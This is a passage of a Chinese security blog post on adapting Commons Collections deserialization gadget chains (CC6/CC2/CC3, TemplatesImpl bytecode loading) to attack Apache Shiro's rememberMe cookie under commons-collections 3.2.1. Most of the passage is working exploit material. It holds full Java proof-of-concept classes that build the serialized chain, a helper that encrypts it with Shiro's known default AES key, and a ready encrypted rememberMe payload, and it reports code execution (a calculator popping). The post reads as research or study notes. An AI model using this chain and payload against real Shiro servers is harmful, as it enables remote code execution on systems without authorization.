org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class CC22 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.setProperty(&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;, &quot;true&quot;);</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">         setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        InvokerTransformer invokerTransformer=new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);</span><br><span class="line">        TransformingComparator transformingComparator =new TransformingComparator(new ConstantTransformer(1));</span><br><span class="line">        PriorityQueue priorityQueue=new PriorityQueue(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        Class c= transformingComparator.getClass();</span><br><span class="line">        Field transformField=c.getDeclaredField(&quot;transformer&quot;);</span><br><span class="line">        transformField.setAccessible(true);</span><br><span class="line">        transformField.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serializable(priorityQueue);</span><br><span class="line">        unserializable();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但是用到了TransformingComparator，但是TransformingComparator在cc4.0中继承了序列化接口，但是在cc3.2.1中是没有继承的导致在CC3.2.1中不能序列化，那我们就不能在这里打这条链。</p>
<p>但是根据上面的利用链图我们可以看到除了TransformingComparator调用invoker的transform方法，就只有chaintranformer方法，但是明显这个是不能使用的，因为我们这里使用chaintransformer就会用到transform方法。</p>
<p>那我们这里就要使用其他的类去调用到transform方法</p>
<p>然后我们这里可以想到在CommonsCollections6中用到了一个类TiedMapEntry，我们使用他的getvalue方法去触发Lazymap的get方法</p>
<p>我们这里先看一下Lazymap的get方法：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public Object get(Object key) &#123;</span><br><span class="line">// create value for key if key is not currently in the map</span><br><span class="line">if (map.containsKey(key) == false) &#123;</span><br><span class="line">Object value = factory.transform(key);</span><br><span class="line">map.put(key, value);</span><br><span class="line">return value;</span><br><span class="line">&#125;</span><br><span class="line">return map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们可以看到在Lazymap的get方法中调用了transform，那么如果这里factory是可控的，我们只用将factory复制为invokertransform类，然后就可以触发transform方法，进而触发后续利用类进行动态类加载字节码。</p>
<p>但是这个前提是factory是可控的，在我们前面在CC6的分析中我们知道这个factory是可控的</p>
<p>我们这里简单回顾一下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017173312082.png"
                      alt="image-20231017173312082"
                ></p>
<p>可以看到Lazymap的构造方法是一个受保护的方法</p>
<p>我们不能直接调用，但是我们在一个静态方法decorate返回了lazymap的构造方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017173734152.png"
                      alt="image-20231017173734152"
                ></p>
<p>那么我们可以看到这个factory的值也是可控的</p>
<p>我们只需要调用decorate方法就可以控制factory变量的值了</p>
<p>其实这里就和CC6一样了</p>
<p>然后再通过TiedMapEntry的getvalue方法触发lazymap的get方法</p>
<p>后面的就是CC6的东西了，使用hashmap或者hashset方法触发TiedMapEntry的hashcode方法进而触发getvalue方法进而触发后续利用链。</p>
<p>那我们这里就可以编写POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.HashSet;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class ccshiro &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.setProperty(&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;, &quot;true&quot;);</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        InvokerTransformer invokerTransformer=new InvokerTransformer(&quot;newTransformer&quot;,null,null);</span><br><span class="line">        Map hashMap = new HashMap();</span><br><span class="line">        Map lazymap = LazyMap.decorate(hashMap, new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = new TiedMapEntry(lazymap,  templates);</span><br><span class="line"></span><br><span class="line">        Map expMap = new HashMap();</span><br><span class="line">        expMap.put(tme, &quot;valuevalue&quot;);</span><br><span class="line">        lazymap.remove(templates);</span><br><span class="line"></span><br><span class="line">        Class c= LazyMap.class;</span><br><span class="line">        Field factoryField=c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factoryField.setAccessible(true);</span><br><span class="line">        factoryField.set(lazymap,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serializable(expMap);</span><br><span class="line">       unserializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser5.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser5.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>本地运行：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017180126001.png"
                      alt="image-20231017180126001"
                ></p>
<p>成功执行。</p>
<p>然后我们就可以测试在shiro框架上面打这条CC链子</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.shiro.crypto.AesCipherService;</span><br><span class="line">import org.apache.shiro.codec.CodecSupport;</span><br><span class="line">import org.apache.shiro.util.ByteSource;</span><br><span class="line">import org.apache.shiro.codec.Base64;</span><br><span class="line">import org.apache.shiro.io.DefaultSerializer;</span><br><span class="line"></span><br><span class="line">import java.nio.file.FileSystems;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">public class test&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(&quot;ser5.bin&quot;));</span><br><span class="line"></span><br><span class="line">        AesCipherService aes = new AesCipherService();</span><br><span class="line">        byte[] key = Base64.decode(CodecSupport.toBytes(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;));</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>还是先固定key加密一下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017180252466.png"
                      alt="image-20231017180252466"
                ></p>
<p>paylaod：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure></div>

<p>然后替换rememberMe的值发包打反序列化漏洞。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017180343108.png"
                      alt="image-20231017180343108"
                ></p>
<p>可以看到成功执行了弹出计算器的程序。</p>
<p>到这里我们的CC改装就成功了。</p>
<p>当然这里也可以用hashset进行利用链调用。这里就不写了，和cc6的利用一样。</p>
<h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>利用链：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017181334967.png"
                      alt="image-20231017181334967"
                ></p>
<p>其实这条利用链就是CC6和CC2与CC3的结合，前半部分是CC6，中间利用的是CC2，最后用到了CC3动态加载字节码。</p>
<p>这条链也就是前面cc链的一个改装解决了tomcat下无法利用shiro原生的<code>commons-collections:3.2.1</code>这个问题。</p>

            </div>

            
                <div class="post-copyright-info">
                    <div class="article-copyright-info-container">
    <ul>
        <li><strong>标题:</strong> shiro反序列化打CC依赖</li>
        <li><strong>作者:</strong> GTL-JU</li>
        <li><strong>创建于:</strong> 2023-10-17 18:20:56</li>
        
            <li>
                <strong>更新于:</strong> 2023-10-17 18:21:39
            </li>
        
        <li>
            <strong>链接:</strong> https://gtl-ju.github.io/2023/10/17/shiro反序列化打CC依赖/
        </li>
        <li>
            <strong>版权声明:</strong> 本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a> 进行许可。
        </li>
    </ul>
</div>

                </div>
            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/java/">#java</a>&nbsp;
                        </li>
                    
                </ul>
            

            

            
                <div class="article-nav">
                    
                        <div class="article-prev">
                            <a class="prev"
                            rel="prev"
                            href="/2023/10/17/nezuko-1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/"
                            >
                                <span class="left arrow-icon flex-center">
                                    <i class="fa-solid fa-chevron-left"></i>
                                </span>
                                <span class="title flex-center">
                                    <span class="post-nav-title-item">nezuko-1打靶记录</span>
                                    <span class="post-nav-item">上一篇</span>
                                </span>
                            </a>
                        </div>
                    
                    
                        <div class="article-next">
                            <a class="next"
                            rel="next"
                            href="/2023/10/13/DC-8%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/"
                            >
                                <span class="title flex-center">
                                    <span class="post-nav-title-item">DC-8打靶记录</span>
                                    <span class="post-nav-item">下一篇</span>
                                </span>
                                <span class="right arrow-icon flex-center">
                                    <i class="fa-solid fa-chevron-right"></i>
                                </span>
                            </a>
                        </div>
                    
                </div>
            


            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">此页目录</div>
        <div class="page-title">shiro反序列化打CC依赖</div>
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%93CC%E4%BE%9D%E8%B5%96"><span class="nav-text">shiro反序列化打CC依赖</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="nav-text">一、前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81shiro%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E6%89%93CC%E4%BE%9D%E8%B5%96%E5%88%86%E6%9E%90"><span class="nav-text">二、shiro无法正常打CC依赖分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81CC%E9%93%BE%E6%94%B9%E8%A3%85"><span class="nav-text">三、CC链改装</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-text">四、总结</span></a></li></ol>

    </div>
</div>
            </div>
        
    </div>
</div>


                

            </div>
            
            

        </div>

        <div class="main-content-footer">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info">
            &copy;
            
              <span>2023</span>
              -
            
            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">GTL-JU</a>
        </div>
        
            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
                        访问人数&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
                        总访问量&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            <span class="powered-by-container">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a> 驱动</span>
                <br>
            <span class="theme-version-container">主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.1.0</a>
        </div>
        
        
        
            <div id="start_div" style="display:none">
                2023/4/8 0:0:0
            </div>
            <div>
                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
            </div>
        
        
        
            <script async data-pjax>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-expand-width flex-center">
            <i class="fa-regular fa-expand"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fa-solid fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fa-solid fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    


</main>




<script src="/js/utils.js"></script>

<script src="/js/main.js"></script>

<script src="/js/layouts/navbarShrink.js"></script>

<script src="/js/tools/scrollTopBottom.js"></script>

<script src="/js/tools/lightDarkSwitch.js"></script>



    
<script src="/js/tools/localSearch.js"></script>




    
<script src="/js/tools/codeBlock.js"></script>




    
<script src="/js/layouts/lazyload.js"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/layouts/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js"></script>







<div class="post-scripts pjax">
    
        
<script src="/js/tools/tocToggle.js"></script>

<script src="/js/libs/anime.min.js"></script>

<script src="/js/layouts/toc.js"></script>

<script src="/js/plugins/tabs.js"></script>

    
</div>


    
<script src="/js/libs/pjax.min.js"></script>

<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            Global.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            Global.utils.pjaxProgressBarEnd();
            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            Global.refresh();
        });
    });
</script>




</body>
</html>
